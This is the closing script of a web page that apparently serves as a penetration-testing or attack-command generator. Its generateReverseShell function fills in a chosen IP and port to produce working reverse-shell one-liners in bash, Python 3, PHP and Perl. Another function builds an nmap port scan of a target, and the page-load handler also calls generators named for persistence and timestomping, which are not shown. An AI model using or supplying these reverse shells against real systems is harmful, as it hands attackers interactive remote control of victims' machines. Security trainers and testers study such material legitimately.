function generateReverseShell() { let ip = document.getElementById('piv_ip').value || 'YOUR_IP'; let port = document.getElementById('piv_port').value || 'YOUR_PORT'; let type = document.getElementById('piv_type').value; let code = ''; switch(type) { case 'bash': code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`; break; case 'python3': code = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`; break; case 'php': code = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`; break; case 'perl': code = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`; break; } document.getElementById('piv_code').innerText = code; }
function generateScanCode() { let target = document.getElementById('scan_target').value; let code = `nmap -sT -p 21,22,25,80,443,3306,8080 --open ${target}`; document.getElementById('scan_code').innerText = code; }
document.addEventListener('DOMContentLoaded', function() { generatePersistenceCode(); generateTimestompCode(); generateReverseShell(); generateScanCode(); });
</script>
</body>
</html>